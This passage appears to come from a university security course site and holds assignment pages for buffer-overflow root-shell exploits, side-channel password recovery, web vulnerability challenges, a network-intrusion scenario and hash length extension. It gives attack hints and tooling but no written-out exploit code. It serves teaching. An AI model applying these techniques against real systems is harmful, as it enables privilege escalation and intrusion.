get_sp() in the exploits you hand in. You should only modify the sploitN.c files and corresponding writeup.txt files; i.e., your exploits should work with unmodified Makefiles, targets, etc. In grading, the exploits may be run with a different working directory. Your exploits must work in these cases also. If you hard-code the target's stack locations into your exploit you should be fine. Your exploit programs should not take any command-line arguments. Shutting down the VM removes the files in /tmp; if you want to keep them, pause the VM and save its state! IMPORTANT: Using the shellcode \u00b6 The shellcode is defined for you in shellcode.h inside each sploitN/ directory. To use the shellcode in your sploit buffers, please import the shellcode with #include and copy the contents programatically . You can do this with memcpy , strcpy , or even just a for loop with array assignments. Please do NOT manually copy-paste the shellcode string literal into your sploitN.c file . While the sploit will still work, it may break grading. Using GDB \u00b6 To run an exploit in GDB, run, e.g., gdb sploit1 to execute sploit1 . Note that there are two executables when we run these programs, since, e.g., sploit1 will execute target1 . Because of this, you can use the following sample workflow to get started in GDB: b main --- break at main in sploit1.c r --- run the executable sploit1 c --- continue until main in target1.c b foo --- set a breakpoint at foo in target1.c Note that you will not be able to set breakpoints in targetN until the program has started executing targetN . That is, e.g., if you tried to run b foo before step 3, you would get the error Function \"foo\" not defined. Here are some additional GDB commands that may come in handy: p var --- prints the value of a variable named var p buf --- (if buf is an array) prints the contents of an array named buf p &buf --- prints the starting address of an array or variable named buf i r --- view registers i frame --- view info about the current stack frame i stack --- view high level info about the stack help <command> --- get help inside GDB about a particular command Also refer back to the sample commands in Assignment 1. Note that this is only a cursory overview of GDB; much more info is available from online resources. Submission \u00b6 Create a file named PID in the student home directory on the VM, and put your PID in it (ex: A12345678 ) Run the following command from the student home directory tar -czvf pa2.tar.gz PID sploit[1-4]/ targets/ This will create a pa2.tar.gz in the home directory with all your files in it. You can see what files were zipped by running tar -tf pa2.tar.gz scp the pa2.tar.gz file to your local computer and submit to gradescope. Note: The autograder will take time to set up, as it'll have to redirect your submissions somewhere else, where your sploits can be tested in the same VirtualBox environment. We'll post an update when it's up. In the meanwhile, you'll know your answer is correct if you followed the instructions above and you were able to get a root shell.","title":"Assignment 2"},{"location":"pa/pa2/#assignment-2-75-pts-25pts-extra-for-sploit4","text":"Deadline: Wednesday, January 29, 2020 by 1:59:59 PM Early Turn-In: Sunday, January 26, 2020 by 11:59:59 PM (10% bonus) The goal of this assignment is to gain hands-on experience with the effects of buffer overflows and other memory-safety bugs. sploit1-sploit3 are required. sploit4 is extra credit! You will be provided a skeleton for implementing these exploits in C. You must not discuss your solution with other students until three days after the assignment deadline. You may consult any online references you wish. If you use any code in your answer that you did not write yourself, you must document that fact. Failure to do so will be considered a violation of the academic integrity policy.","title":"Assignment 2 75 pts + 25pts extra for sploit4"},{"location":"pa/pa2/#getting-started","text":"To complete this assignment you will be provided with a VirtualBox VM and a set of files.","title":"Getting Started"},{"location":"pa/pa2/#vm-image","text":"In order to match the environment in which your submission will be graded, all work for this assignment must be done on the VirtualBox VM we have provided, named pa2box . You can download the VM image here . Import the pa2box.vbox file into VirtualBox via the Machine \u2192 Add menu item. Don't create a brand-new VirtualBox VM or import the pa2box-data.vmdk file on its own: if you do this, you won't have the correct configuration. After importing the VM, select it in the VirtualBox sidebar and start it with the green arrow button or the Machine \u2192 Start menu item. The VM is configured with two users: student , with password hacktheplanet ; and root , with password hackallthethings . Instead of using the command line through VirtualBox, we recommend that you SSH into your VM from another client. The VM image is configured to expose an SSH server on port 2222 of your system's loopback address ( 127.0.0.1 ). To SSH into the VM (from your host system running VirtualBox, not from inside the VM): ssh - p 2222 student @127.0.0.1 To copy files from your computer to the VM: scp - P 2222 - r / path / to / files / student @127.0.0.1 :/ home / student To copy files from the VM to your computer: scp - P 2222 student @127.0.0.1 :/ path / to / files / / destination / path Please note that SSH is disabled for root , so you can only SSH in as the student user. You can still log in as root using su or by logging into the VM directly.","title":"VM Image"},{"location":"pa/pa2/#assignment-files","text":"Starter files are included inside the student home directory of the VM image. The targets directory contains a Makefile to generate target executables specific to your PID (as well as a folder called base , which you should not modify, used to generate the targets). Exploit starter code can be found in the sploits1 - sploits4 directories: one per each of the four vulnerable target programs. Each of these contains a Makefile , a shellcode.h header file providing Aleph One's shellcode, and a sploitN.c file in which you should write your exploit code (in addition to an assignment.toml file, which should not be modified). You will be writing an exploit for each of the four vulnerable programs provided in the assignment. Each exploit, when run in the VM with its target installed setuid-root in /tmp , should yield a root shell ( /bin/sh ). You can verify that the shell has been launched as root by typing whoami , to which you should see the response root . You must use Aleph One\u2019s shellcode in shellcode.h , as this will be used in the grading scripts. For each exploit, in addition to your .c file, please also create a corresponding file writeup.txt containing a brief description of how the exploit works.","title":"Assignment Files"},{"location":"pa/pa2/#exploit-generation","text":"To complete the assignment, you will need to: generate targets specific to your PID; use GDB to find vulnerabilities in the targets; and, finally, craft your exploit programs.","title":"Exploit Generation"},{"location":"pa/pa2/#generating-the-targets","text":"Run make generate in the targets directory to create the four target source files specific to you. This will prompt you for your student ID ( A######## or U######## ), which will be used to randomize portions of the contents of target1.c - target4.c . Run make to build the target binaries target1 - target4 . Run sudo make install to copy the binaries into the /tmp directory. Finally, run sudo make setuid to mark the binaries as setuid-root. If you forget this step, then your exploits will end up launching a normal shell instead of a root shell!","title":"Generating the Targets"},{"location":"pa/pa2/#exploit-notes","text":"For this assignment you should read and have a solid understanding of Aleph One\u2019s \u201cSmashing the Stack for Fun and Profit\u201d. Aleph One gives code that calculates addresses on the target\u2019s stack based on addresses on the exploit\u2019s stack. However, addresses on the exploit\u2019s stack can change based on how the exploit is executed (working directory, arguments, environment, etc.). You must therefore hard-code target stack locations in your exploits. You should not use a function such as get_sp() in the exploits you hand in. You should only modify the sploitN.c files and corresponding writeup.txt files; i.e., your exploits should work with unmodified Makefiles, targets, etc. In grading, the exploits may be run with a different working directory. Your exploits must work in these cases also. If you hard-code the target's stack locations into your exploit you should be fine. Your exploit programs should not take any command-line arguments. Shutting down the VM removes the files in /tmp; if you want to keep them, pause the VM and save its state!","title":"Exploit Notes"},{"location":"pa/pa2/#important-using-the-shellcode","text":"The shellcode is defined for you in shellcode.h inside each sploitN/ directory. To use the shellcode in your sploit buffers, please import the shellcode with #include and copy the contents programatically . You can do this with memcpy , strcpy , or even just a for loop with array assignments. Please do NOT manually copy-paste the shellcode string literal into your sploitN.c file . While the sploit will still work, it may break grading.","title":"IMPORTANT: Using the shellcode"},{"location":"pa/pa2/#using-gdb","text":"To run an exploit in GDB, run, e.g., gdb sploit1 to execute sploit1 . Note that there are two executables when we run these programs, since, e.g., sploit1 will execute target1 . Because of this, you can use the following sample workflow to get started in GDB: b main --- break at main in sploit1.c r --- run the executable sploit1 c --- continue until main in target1.c b foo --- set a breakpoint at foo in target1.c Note that you will not be able to set breakpoints in targetN until the program has started executing targetN . That is, e.g., if you tried to run b foo before step 3, you would get the error Function \"foo\" not defined. Here are some additional GDB commands that may come in handy: p var --- prints the value of a variable named var p buf --- (if buf is an array) prints the contents of an array named buf p &buf --- prints the starting address of an array or variable named buf i r --- view registers i frame --- view info about the current stack frame i stack --- view high level info about the stack help <command> --- get help inside GDB about a particular command Also refer back to the sample commands in Assignment 1. Note that this is only a cursory overview of GDB; much more info is available from online resources.","title":"Using GDB"},{"location":"pa/pa2/#submission","text":"Create a file named PID in the student home directory on the VM, and put your PID in it (ex: A12345678 ) Run the following command from the student home directory tar -czvf pa2.tar.gz PID sploit[1-4]/ targets/ This will create a pa2.tar.gz in the home directory with all your files in it. You can see what files were zipped by running tar -tf pa2.tar.gz scp the pa2.tar.gz file to your local computer and submit to gradescope. Note: The autograder will take time to set up, as it'll have to redirect your submissions somewhere else, where your sploits can be tested in the same VirtualBox environment. We'll post an update when it's up. In the meanwhile, you'll know your answer is correct if you followed the instructions above and you were able to get a root shell.","title":"Submission"},{"location":"pa/pa3/","text":"Assignment 3 100pts \u00b6 Deadline: Wednesday, February 5, 2020 by 13:59:59 Early Turn-In: Sunday, February 2, 2020 by 23:59:59 (10% bonus) The goal of this assignment is to gain hands-on experience exploiting side channels. This assignment will demonstrate how side channels can be just as dangerous as the control flow vulnerabilities you exploited in Assignment 2. You will be provided a two skeleton files ( memhack.c and timehack.c ) that you will use to exploit side channels present in a target library ( sysapp.c ) to obtain a protected key. You may consult any online references you wish. If you use any code in your answer that you did not write yourselves, you must document that fact. Failure to do so will be considered a violation of the academic integrity policy. Getting Started \u00b6 Just like previous assignments, for this assignment you will be provided with a VirtualBox VM containing all the files you need. The VM is named pa3box , and you can download the VM image here . As in previous assignments, import the pa3box.vbox file into VirtualBox via the Machine \u2192 Add menu item; don't create a brand-new VirtualBox VM or import the pa3box-data.vmdk file on its own: if you do this, you won't have the correct configuration. The VM is configured with two users: student , with password hacktheplanet ; and root , with password hackallthethings . We recommend you use the VM via ssh and scp , just like previous assignments. Please note that SSH is disabled for root , so you can only SSH in as the student user. You can still log in as root using su or by logging into the VM directly. Assignment Files \u00b6 Starter files are included inside the student user's home directory within the VM image. There are two parts to this assignment, each with its own subdirectory, memhack and timehack . Each subdirectory contains exploit starter code ( memhack.c or timehack.c ), which imports a library ( sysapp.c , with the same contents across the two subdirectories) with password-checking functionality vulnerable to side-channel attacks. You should not modify sysapp.c , only memhack.c and timehack.c . Each subdirectory contains a Makefile for building your exploits. Assignment Instructions \u00b6 You will be writing two exploits, each of which takes advantage of a side channel, to obtain the password in sysapp.c . In memhack.c , you will exploit a memory-based side channel, and in timehack.c you will exploit a timing-based side channel. See Section 2 for specific details. Once both of your exploits can determine the password in sysapp.c and call the hack_system() function successfully, the assignment is complete. Additionally, for each exploit, provide a brief description of how it works in its corresponding writeup.txt file. Submitting Your Solutions \u00b6 Submit memhack.c and timehack.c to the corresponding assignments on Gradescope, and submit a combined writeup to the writeup assignment on Gradescope. Exploit Construction \u00b6 Memory-Based Side Channel \u00b6 We recommend you start with the memory-based side channel because it is deterministic and doesn't have problems with noise. Look at the check_pass() function in sysapp.c and note two things: The password string is passed by reference The memory it points to is checked against the reference password one character at a time. Now look in memhack.c and note how a buffer is allocated such that the page starting at page start is protected (i.e., accessing it will caused a segmentation fault, or SEGV) and the previous 32 characters are allocated. Now look at the demonstration function demonstrate_signals() , which shows how referencing any memory in the protected page will produce a fault as well as how to catch that fault in your program. You do not need to use this function; it is merely there to show you how to use signals to capture whether a memory reference touched a page or not. Now you will want to create a framework (in memhack.c ) to call check_pass() with different inputs and catching any resulting faults so you can determine if part of the password is correct. We suggest a loop over the maximum password size (32 characters) where for the first guess you store the password such that its first character is one byte before page start and then iterate between possible choices for the first character (when you get it right you will get a page fault). Repeat this to guess the entire password. Note that all ASCII symbols from ASCII 33 ( ! ) to ASCII 126 ( \u223c ) can be used in the password. Other hints: You are already given a page protected buffer with enough memory to crack the password. All you need to do is use it appropriately for each guess you make. The demonstrate_signals function handles all the segfaults for you. You can re-use almost all of it in your code. Timing-Based Side Channel \u00b6 Unlike the memory-based side channel, the timing-based side channel will deal with noise. Go back and look at check_pass() . An artificial delay has been added when each character is checked to make your life easier (it\u2019s possible to do the assignment without it but it would require a much more careful methodology). The execution time of check_pass() depends on how many characters you guess correctly . Look in timehack.c and find a macro there for a function called rdtsc() which invokes the processors cycle counter (a clock that increments by one for each processor cycle that passes). In general, treat rdtsc() as a free running timer that returns a long . Insert a call to rdtsc() before the call to check_pass() and afterwards. Print the difference between these values to see how long (in cycles) the password checking ran. Run the program a few times. Now change the guess string so the first character is correct. Run again and see how the time difference changes. Now automate this entire process, in the style of the original approach in memhack.c . Note that unlike the memhack attack, the timehack problem will have to deal with noise . Depending on things like what other programs are running, the status of the cache, the contents of the branch target buffer, etc... there can be significant variability in the amount of time each check takes. This will matter in practice. You will want to run a lot of trials before you reach your conclusion about each character. Other hints: Be careful in using printf \u2019s. These can blow out the instruction cache and data caches and perturb your results (i.e. overwhelm the timing effects you are trying to detect). Be careful in averaging across trials. If your process is descheduled in the middle of a measurement, the time cost of that individual trial will be so large that it overwhelms everything else. Instead, the median is your friend. However, feel free to experiment if something does not work for you. If time is not continuing to increase as you progress through characters, then you probably made a bad guess earlier. Backtrack. rdtsc() will wrap around at some point. You may need to handle this outlier if it is causing issues. Debugging advice: make a big array to hold your timing measurements and print them at the end. Be sure to test a bunch of different passwords. We will when we grade. Final Notes \u00b6 Do not write a solution that simply checks all passwords exhaustively. You will not get credit for this. The timing side-channel should be exploitable in linear time (we will stop programs that are running for excessive periods) and it will basically feel instantaneous for passwords of 8 characters or less (note we will not test passwords over 12 characters).","title":"Assignment 3"},{"location":"pa/pa3/#assignment-3-100pts","text":"Deadline: Wednesday, February 5, 2020 by 13:59:59 Early Turn-In: Sunday, February 2, 2020 by 23:59:59 (10% bonus) The goal of this assignment is to gain hands-on experience exploiting side channels. This assignment will demonstrate how side channels can be just as dangerous as the control flow vulnerabilities you exploited in Assignment 2. You will be provided a two skeleton files ( memhack.c and timehack.c ) that you will use to exploit side channels present in a target library ( sysapp.c ) to obtain a protected key. You may consult any online references you wish. If you use any code in your answer that you did not write yourselves, you must document that fact. Failure to do so will be considered a violation of the academic integrity policy.","title":"Assignment 3 100pts"},{"location":"pa/pa3/#getting-started","text":"Just like previous assignments, for this assignment you will be provided with a VirtualBox VM containing all the files you need. The VM is named pa3box , and you can download the VM image here . As in previous assignments, import the pa3box.vbox file into VirtualBox via the Machine \u2192 Add menu item; don't create a brand-new VirtualBox VM or import the pa3box-data.vmdk file on its own: if you do this, you won't have the correct configuration. The VM is configured with two users: student , with password hacktheplanet ; and root , with password hackallthethings . We recommend you use the VM via ssh and scp , just like previous assignments. Please note that SSH is disabled for root , so you can only SSH in as the student user. You can still log in as root using su or by logging into the VM directly.","title":"Getting Started"},{"location":"pa/pa3/#assignment-files","text":"Starter files are included inside the student user's home directory within the VM image. There are two parts to this assignment, each with its own subdirectory, memhack and timehack . Each subdirectory contains exploit starter code ( memhack.c or timehack.c ), which imports a library ( sysapp.c , with the same contents across the two subdirectories) with password-checking functionality vulnerable to side-channel attacks. You should not modify sysapp.c , only memhack.c and timehack.c . Each subdirectory contains a Makefile for building your exploits.","title":"Assignment Files"},{"location":"pa/pa3/#assignment-instructions","text":"You will be writing two exploits, each of which takes advantage of a side channel, to obtain the password in sysapp.c . In memhack.c , you will exploit a memory-based side channel, and in timehack.c you will exploit a timing-based side channel. See Section 2 for specific details. Once both of your exploits can determine the password in sysapp.c and call the hack_system() function successfully, the assignment is complete. Additionally, for each exploit, provide a brief description of how it works in its corresponding writeup.txt file.","title":"Assignment Instructions"},{"location":"pa/pa3/#submitting-your-solutions","text":"Submit memhack.c and timehack.c to the corresponding assignments on Gradescope, and submit a combined writeup to the writeup assignment on Gradescope.","title":"Submitting Your Solutions"},{"location":"pa/pa3/#exploit-construction","text":"","title":"Exploit Construction"},{"location":"pa/pa3/#memory-based-side-channel","text":"We recommend you start with the memory-based side channel because it is deterministic and doesn't have problems with noise. Look at the check_pass() function in sysapp.c and note two things: The password string is passed by reference The memory it points to is checked against the reference password one character at a time. Now look in memhack.c and note how a buffer is allocated such that the page starting at page start is protected (i.e., accessing it will caused a segmentation fault, or SEGV) and the previous 32 characters are allocated. Now look at the demonstration function demonstrate_signals() , which shows how referencing any memory in the protected page will produce a fault as well as how to catch that fault in your program. You do not need to use this function; it is merely there to show you how to use signals to capture whether a memory reference touched a page or not. Now you will want to create a framework (in memhack.c ) to call check_pass() with different inputs and catching any resulting faults so you can determine if part of the password is correct. We suggest a loop over the maximum password size (32 characters) where for the first guess you store the password such that its first character is one byte before page start and then iterate between possible choices for the first character (when you get it right you will get a page fault). Repeat this to guess the entire password. Note that all ASCII symbols from ASCII 33 ( ! ) to ASCII 126 ( \u223c ) can be used in the password. Other hints: You are already given a page protected buffer with enough memory to crack the password. All you need to do is use it appropriately for each guess you make. The demonstrate_signals function handles all the segfaults for you. You can re-use almost all of it in your code.","title":"Memory-Based Side Channel"},{"location":"pa/pa3/#timing-based-side-channel","text":"Unlike the memory-based side channel, the timing-based side channel will deal with noise. Go back and look at check_pass() . An artificial delay has been added when each character is checked to make your life easier (it\u2019s possible to do the assignment without it but it would require a much more careful methodology). The execution time of check_pass() depends on how many characters you guess correctly . Look in timehack.c and find a macro there for a function called rdtsc() which invokes the processors cycle counter (a clock that increments by one for each processor cycle that passes). In general, treat rdtsc() as a free running timer that returns a long . Insert a call to rdtsc() before the call to check_pass() and afterwards. Print the difference between these values to see how long (in cycles) the password checking ran. Run the program a few times. Now change the guess string so the first character is correct. Run again and see how the time difference changes. Now automate this entire process, in the style of the original approach in memhack.c . Note that unlike the memhack attack, the timehack problem will have to deal with noise . Depending on things like what other programs are running, the status of the cache, the contents of the branch target buffer, etc... there can be significant variability in the amount of time each check takes. This will matter in practice. You will want to run a lot of trials before you reach your conclusion about each character. Other hints: Be careful in using printf \u2019s. These can blow out the instruction cache and data caches and perturb your results (i.e. overwhelm the timing effects you are trying to detect). Be careful in averaging across trials. If your process is descheduled in the middle of a measurement, the time cost of that individual trial will be so large that it overwhelms everything else. Instead, the median is your friend. However, feel free to experiment if something does not work for you. If time is not continuing to increase as you progress through characters, then you probably made a bad guess earlier. Backtrack. rdtsc() will wrap around at some point. You may need to handle this outlier if it is causing issues. Debugging advice: make a big array to hold your timing measurements and print them at the end. Be sure to test a bunch of different passwords. We will when we grade.","title":"Timing-Based Side Channel"},{"location":"pa/pa3/#final-notes","text":"Do not write a solution that simply checks all passwords exhaustively. You will not get credit for this. The timing side-channel should be exploitable in linear time (we will stop programs that are running for excessive periods) and it will basically feel instantaneous for passwords of 8 characters or less (note we will not test passwords over 12 characters).","title":"Final Notes"},{"location":"pa/pa4/","text":"Assignment 4 80pts \u00b6 Deadline: Wednesday, February 19, 2029 by 13:59:59 Early Turn-In: Sunday, February 16, 2019 by 23:59:59(10% bonus) Overview \u00b6 The goal of this assignment is to gain hands-on experience exploiting vulnerabilities on websites. This assignment will demonstrate how simple vulnerabilities (often occurring due to the carelessness of the website developer) can be really harmful to the website's owners. Security attacks include but aren't limited to stealing sensitive information, injecting malicious code, and causing the host server to crash. In this assignment, you have 8 'levels' or 'challenges' (each worth 10 points). In each challenge, you have to find the 'flag'. A flag is just a secret password that you need to find by exploiting certain vulnerabilities. Once you have the password, just enter it in the text box and hit the submit button to move up one level. Every challenge comes with hints and clues (present as text on the web page itself) which will guide you through exploiting a particular vulnerability. You may consult any online references you wish. Getting Started/Logging In \u00b6 Visit https://c10-32.sysnet.ucsd.edu/challenges/ . In this page, you will be asked to enter your PID and a password. You can find your password in your Gradescope account for this class (look for the \"Assignment 4 userinfo\" assignment). A Word of Caution \u00b6 Each level comes with a description of its password. As mentioned before, every password is completely randomized for every level, and the fastest way to get to the password is by exploiting the said vulnerability. It should also be noted that brute-force techniques will not work. We have kept limits on the number of ping and http connections that every account can send to our server each day. If you reach this limit, you will be blocked for the rest of the day. So please do not try to DDOS the server with random tries. Prior Knowledge \u00b6 During the assignment, you may encounter situations that may require to either execute HTML, Client-side JavaScript or SQL statements. Some levels can be solved with a few lines written in Python. However, no code that you are expected to write in this assignment exceeds 10 (very small) lines. Most of the expected code is pretty generic and can be found with a quick Google search. The aim of the assignment is not to teach you coding in the said languages, but to give you hands-on experience with the tricks that most \"hackers\" or exploiters use in today's world. During no time are you expected to know \"truly fancy\" stuff like PHP, ASP, server-side JavaScript, AJAX, JQuery, Flash, CSS or in general - anything beyond the realms of the aforementioned techniques. Useful Resources \u00b6 Here are few resources which you may find very helpful while solving the assignment. They are, in no particular order: GET and POST requests - https://www.w3schools.com/tags/ref_httpmethods.asp Python Requests library - http://docs.python-requests.org/en/master/ Handling Cookies on your browser - https://kb.iu.edu/d/ajfi Intro to JavaScript - https://www.w3schools.com/js/default.asp Intro to SQL - https://www.w3schools.com/sql/sql_intro.asp Base64 Library (Python) Encoding and Decoding - https://code.tutsplus.com/tutorials/base64-encoding-and-decoding-using-python--cms-25588 Final Notes \u00b6 Exploiting vulnerabilities on web services is perhaps as old as the web. This assignment is designed to give you a first-hand feel of what people who exploit vulnerabilities look at. It is intended to make you think about these vulnerabilities, whenever you design a web service of your own. However, since it is intended for academic purposes, it is heavily toned down. Think of it as a toy model of the real world. We have even included hints and descriptions on every level. Just following these and only these should be enough to get you through. In the real world, the \"hacker\" will not have any hints and will have to systematically try everything. This is often long and meticulous, and not suited for assignment format. Hence, your best friends are the hints present in every level. Happy hacking!","title":"Assignment 4"},{"location":"pa/pa4/#assignment-4-80pts","text":"Deadline: Wednesday, February 19, 2029 by 13:59:59 Early Turn-In: Sunday, February 16, 2019 by 23:59:59(10% bonus)","title":"Assignment 4 80pts"},{"location":"pa/pa4/#overview","text":"The goal of this assignment is to gain hands-on experience exploiting vulnerabilities on websites. This assignment will demonstrate how simple vulnerabilities (often occurring due to the carelessness of the website developer) can be really harmful to the website's owners. Security attacks include but aren't limited to stealing sensitive information, injecting malicious code, and causing the host server to crash. In this assignment, you have 8 'levels' or 'challenges' (each worth 10 points). In each challenge, you have to find the 'flag'. A flag is just a secret password that you need to find by exploiting certain vulnerabilities. Once you have the password, just enter it in the text box and hit the submit button to move up one level. Every challenge comes with hints and clues (present as text on the web page itself) which will guide you through exploiting a particular vulnerability. You may consult any online references you wish.","title":"Overview"},{"location":"pa/pa4/#getting-startedlogging-in","text":"Visit https://c10-32.sysnet.ucsd.edu/challenges/ . In this page, you will be asked to enter your PID and a password. You can find your password in your Gradescope account for this class (look for the \"Assignment 4 userinfo\" assignment).","title":"Getting Started/Logging In"},{"location":"pa/pa4/#a-word-of-caution","text":"Each level comes with a description of its password. As mentioned before, every password is completely randomized for every level, and the fastest way to get to the password is by exploiting the said vulnerability. It should also be noted that brute-force techniques will not work. We have kept limits on the number of ping and http connections that every account can send to our server each day. If you reach this limit, you will be blocked for the rest of the day. So please do not try to DDOS the server with random tries.","title":"A Word of Caution"},{"location":"pa/pa4/#prior-knowledge","text":"During the assignment, you may encounter situations that may require to either execute HTML, Client-side JavaScript or SQL statements. Some levels can be solved with a few lines written in Python. However, no code that you are expected to write in this assignment exceeds 10 (very small) lines. Most of the expected code is pretty generic and can be found with a quick Google search. The aim of the assignment is not to teach you coding in the said languages, but to give you hands-on experience with the tricks that most \"hackers\" or exploiters use in today's world. During no time are you expected to know \"truly fancy\" stuff like PHP, ASP, server-side JavaScript, AJAX, JQuery, Flash, CSS or in general - anything beyond the realms of the aforementioned techniques.","title":"Prior Knowledge"},{"location":"pa/pa4/#useful-resources","text":"Here are few resources which you may find very helpful while solving the assignment. They are, in no particular order: GET and POST requests - https://www.w3schools.com/tags/ref_httpmethods.asp Python Requests library - http://docs.python-requests.org/en/master/ Handling Cookies on your browser - https://kb.iu.edu/d/ajfi Intro to JavaScript - https://www.w3schools.com/js/default.asp Intro to SQL - https://www.w3schools.com/sql/sql_intro.asp Base64 Library (Python) Encoding and Decoding - https://code.tutsplus.com/tutorials/base64-encoding-and-decoding-using-python--cms-25588","title":"Useful Resources"},{"location":"pa/pa4/#final-notes","text":"Exploiting vulnerabilities on web services is perhaps as old as the web. This assignment is designed to give you a first-hand feel of what people who exploit vulnerabilities look at. It is intended to make you think about these vulnerabilities, whenever you design a web service of your own. However, since it is intended for academic purposes, it is heavily toned down. Think of it as a toy model of the real world. We have even included hints and descriptions on every level. Just following these and only these should be enough to get you through. In the real world, the \"hacker\" will not have any hints and will have to systematically try everything. This is often long and meticulous, and not suited for assignment format. Hence, your best friends are the hints present in every level. Happy hacking!","title":"Final Notes"},{"location":"pa/pa5/","text":"Assignment 5 100pts \u00b6 Deadline: Wednesday, March 4, 2020 by 13:59:59 Early Turn-In: Sunday, March 1, 2020 by 11:59:59 PM (10% bonus) Introduction \u00b6 A talented but, unfortunately, clumsy student in Deian's research group accidentally dropped a flash drive in the campus coffee shop. You, an infamously nefarious hacker known far and wide as the archvillain of the research group, noticed this dropped flash drive, and quickly but surreptitiously pocketed it. As usual, you're trying to do everything in your power to disrupt all of the activities of the research group. Your latest scheme requires you to get control of the account Deian uses to access campus networks, and you have a sneaking suspicion that this dropped flash drive might be just the foothold you need in order to set your scheme in motion. Being a smart but cautious hacker, you connected the flash drive to a secure, isolated machine to inspect its contents. You don't want a repeat of that one time when a similar dropped flash drive actually contained a nasty virus and you ended up having to wipe your machine and reinstall your operating system. But this one seems to have nothing suspicious, no traps or hidden surprises. This drop seems to actually have been an accident. Feeling exhilarated, you quickly email a dump of the flash drive's contents to yourself so you can access it on your primary machine. Unfortunately, a quick glance shows that there's not much of interest on this flash drive itself. You were hoping it might have something juicy, like the plans for the research group's next super-potent virus. But all is not lost. You might still be able to use some of the information on this flash drive to breach into the research group's super-secret network. And then who knows what information you might be able to find just by listening in to what's going on... Logistics and Opening Hints \u00b6 You should have already received the \"email to yourself\" with the dump of the dropped flash drive's contents; the email's subject is \"flash drive dump\". (If you don't immediately see it, you may need to check your spam folder.) That should be all you need to get started - what interesting things might be here that would prove useful for your hacking activities? You'll eventually have to turn in a writeup describing the steps you took to achieve your goals, so you may want to keep a log as you go in order to make that easier. Linux commands you may need to know about or look up for this assignment, in alphabetical order, include: - nc - nmap - ssh - tcpdump - wget Certain flags of some of these commands may also come in useful, such as -F , -i , -p , and -X , among others. Information can be found on man pages (e.g., man nc ) or online. We hope this assignment will be enjoyable and interesting for you. In order to preserve the experience for everyone, please be careful with spoilers on Piazza and in class - part of the fun is finding the relevant information and figuring out how you're supposed to use it. As usual, the TA's will be available in office hours and via private questions on Piazza to provide help and maybe some hints if necessary. Also, once you breach into the network, you should be able to find a README.md file in the victim's home directory with additional directions and hints for the next steps. Good luck in your hacking!","title":"Assignment 5"},{"location":"pa/pa5/#assignment-5-100pts","text":"Deadline: Wednesday, March 4, 2020 by 13:59:59 Early Turn-In: Sunday, March 1, 2020 by 11:59:59 PM (10% bonus)","title":"Assignment 5 100pts"},{"location":"pa/pa5/#introduction","text":"A talented but, unfortunately, clumsy student in Deian's research group accidentally dropped a flash drive in the campus coffee shop. You, an infamously nefarious hacker known far and wide as the archvillain of the research group, noticed this dropped flash drive, and quickly but surreptitiously pocketed it. As usual, you're trying to do everything in your power to disrupt all of the activities of the research group. Your latest scheme requires you to get control of the account Deian uses to access campus networks, and you have a sneaking suspicion that this dropped flash drive might be just the foothold you need in order to set your scheme in motion. Being a smart but cautious hacker, you connected the flash drive to a secure, isolated machine to inspect its contents. You don't want a repeat of that one time when a similar dropped flash drive actually contained a nasty virus and you ended up having to wipe your machine and reinstall your operating system. But this one seems to have nothing suspicious, no traps or hidden surprises. This drop seems to actually have been an accident. Feeling exhilarated, you quickly email a dump of the flash drive's contents to yourself so you can access it on your primary machine. Unfortunately, a quick glance shows that there's not much of interest on this flash drive itself. You were hoping it might have something juicy, like the plans for the research group's next super-potent virus. But all is not lost. You might still be able to use some of the information on this flash drive to breach into the research group's super-secret network. And then who knows what information you might be able to find just by listening in to what's going on...","title":"Introduction"},{"location":"pa/pa5/#logistics-and-opening-hints","text":"You should have already received the \"email to yourself\" with the dump of the dropped flash drive's contents; the email's subject is \"flash drive dump\". (If you don't immediately see it, you may need to check your spam folder.) That should be all you need to get started - what interesting things might be here that would prove useful for your hacking activities? You'll eventually have to turn in a writeup describing the steps you took to achieve your goals, so you may want to keep a log as you go in order to make that easier. Linux commands you may need to know about or look up for this assignment, in alphabetical order, include: - nc - nmap - ssh - tcpdump - wget Certain flags of some of these commands may also come in useful, such as -F , -i , -p , and -X , among others. Information can be found on man pages (e.g., man nc ) or online. We hope this assignment will be enjoyable and interesting for you. In order to preserve the experience for everyone, please be careful with spoilers on Piazza and in class - part of the fun is finding the relevant information and figuring out how you're supposed to use it. As usual, the TA's will be available in office hours and via private questions on Piazza to provide help and maybe some hints if necessary. Also, once you breach into the network, you should be able to find a README.md file in the victim's home directory with additional directions and hints for the next steps. Good luck in your hacking!","title":"Logistics and Opening Hints"},{"location":"pa/pa6/","text":"Assignment 6 \u00b6 Deadline Friday, March 13, 2020 by 23:59:59 Early Turn-In: Wednesday, March 11, 2020 by 23:59:59 Overview \u00b6 In this project, we'll start by investigating Vigenere ciphers, then move on to investigating vulnerabilities in widely used cryptographic hash functions, including length-extension attacks and collision vulnerabilities, and an implementation vulnerability in a popular digital signature scheme. Part 1: Vigenere ciphers \u00b6 For this problem, solve by hand or write a program (perhaps in Python). You can read about how the Vigenere cipher works on Wikipedia . Vigenere ciphers can be generally deciphered using Kasiski Examination, which is discussed on the wikipedia page. You can find some ciphertext produced with the Vigenere cipher under a certain key on Gradescope as the assignment \"Assignment 6 ciphertext\". Assume that encrypting the letter A with the key results in no change, encrypting the letter B results in an increment by one place in the alphabet, encrypting C resulting in an increment by two places, etc. Also assume that the original plaintext contains only uppercase letters (A-Z) and no spaces or punctuation. What is the key? What to submit A text file named vigenere.key containing your key. Historical note : This November, it was discovered that the security company Fortinet was using \"XOR encryption with a static key\" in some products, which is similar to a Vigenere cipher and has similar (lack of) security properties. https://seclists.org/bugtraq/2019/Nov/38 Part 2: Length extension \u00b6 In most applications, you should use MACs such as HMAC-SHA256 instead of plain cryptographic hash functions (e.g., MD5, SHA-1, or SHA-256) because hashes, also known as digests, fail to match our intuitive security expectations. What we really want is something that behaves like a pseudorandom function, which HMACs seem to approximate and hash functions do not. One difference between hash functions and pseudorandom functions is that many hashes are subject to length extension . Many common hash functions use a design called the Merkle-Damgard construction. Each is built around a compression function f and maintains an internal state s , which is initialized to a fixed constant. Messages are processed in fixed-size blocks by applying the compression function to the current state and current block to compute an updated internal state, i.e., s_{i+1} = f(s_i, b_i). The result of the final application of the compression function becomes the output of the hash function. A consequence of this design is that if we know the hash of an n -block message, we can find the hash of longer messages by applying the compression function for each block b_{n+1}, b_{n+2}, ... that we want to add. This process is called length extension, and it can be used to attack many applications of hash functions. 2a. Experimenting \u00b6 To experiment with this idea, we'll use a Python implementation of the MD5 hash function, though SHA-1 and SHA-256 are vulnerable to length extension in the same way. You can download the 